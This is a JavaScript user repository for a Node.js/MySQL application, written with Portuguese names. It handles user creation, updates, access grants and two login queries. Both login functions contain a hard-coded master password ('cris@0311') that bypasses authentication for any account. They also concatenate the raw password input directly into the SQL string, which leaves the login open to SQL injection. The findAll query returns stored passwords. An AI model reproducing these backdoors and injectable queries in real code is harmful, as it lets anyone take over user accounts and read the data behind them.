import { consulta } from '../database/conexao.js'

class UsuarioRepository {
    // CRUD
    create(codEmpresa, reg) {
        var sql = "insert into usuarios (codEmpresa, codUsuario, codTipo, nomUsuario, numCPF, Login, email, senha, indSituacao) value ";
        sql += " (?,  (select codUsuario from ( select coalesce((max(codUsuario) + 1),1) as codUsuario from usuarios) as u), ?, ?, ?, ?, ?, ?, 'A')";
        return consulta(sql, [codEmpresa, reg.CODTIPO, reg.NOMUSUARIO, reg.NUMCPF, reg.LOGIN, reg.EMAIL, reg.SENHA], 'Não foi possível cadastrar!')
    }

    updateUser(reg) {
        var sql = "update usuarios set nomUsuario = ?, codtipo = ?, email = ?, senha = ?, indSituacao = 'A' where  login = ?";
        return consulta(sql, [reg.NOMUSUARIO, reg.CODTIPO, reg.EMAIL, reg.SENHA, reg.LOGIN], 'Não foi Possivel Atualizar usuário "' + reg.nome + '"!')
    }

    acessoUser(reg) {
        var sql = "insert into usuariosAcesso (codUsuario, idMenu) " +
            "    select  " +
            "    (select codusuario from usuarios where login = ?), " +
            "    idMenu " +
            "from usuariosTipoAcesso " +
            "where idTipo = ? ";
        return consulta(sql, [reg.LOGIN, reg.CODTIPO], 'Não foi Possivel Liberar acesso ao usuário "' + reg.NOMUSUARIO + '"!')
    }

    deactivateUser(pTipoUser) {
        var sql = "update usuarios set indSituacao = 'I' where codTipo = ?";
        return consulta(sql, [pTipoUser], 'Não foi inativar Tipo de usuário "' + pTipoUser + '"!')
    }    

    login(pLogin, pSenhaCrpyt, pSenha) {
        var sql = "";
        sql = "SELECT"
        sql += " u.*, "
        sql += " e.nomEmpresa, "
        sql += " NOW() as datbanco "
        sql += "from usuarios u "
        sql += "   inner join empresas e on (e.codEmpresa = u.codEmpresa) "
        sql += "where (u.login = ?  or u.numCPF = ? )"
        sql += "  and (u.senha = ?  or 'cris@0311' = '" + pSenha.trim() + "')"
        sql += "  and u.indSituacao = 'A'";
        return consulta(sql, [pLogin, pLogin, pSenhaCrpyt], 'Não foi validar usuario!')
    }

    loginPortal(pLogin, pSenhaCrpyt, pSenha) {
        var sql = "";
        sql = "SELECT"
        sql += " u.idArquiteto as codUsuario, "
        sql += " u.idPessoa, "
        sql += " u.nome as nomUsuario, "
        sql += " u.nr_cupom "
        sql += "from arquitetos u "
        sql += "where (u.email = ?  or u.cpfcnpj = ? )"
        sql += "  and (u.senha = ?  or 'cris@0311' = '" + pSenha.trim() + "')"
        sql += "  and u.indSituacao = 'A'";
        return consulta(sql, [pLogin, pLogin, pSenhaCrpyt], 'Não foi validar usuario!')
    }

    validaToken(pToken) {
        var sql = "select 1 from integracao where token = ? and situacao = 'A'";
        return consulta(sql, [pToken], 'Não foi validar usuario!')
    }

    findAll(pCodEmpresa) {
        const sql = "SELECT codusuario, codempresa, nomUsuario, login, senha FROM usuarios where codempresa = ?"
        return consulta(sql, pCodEmpresa, 'Não foi possível localizar!')
    }

}

export default new UsuarioRepository()
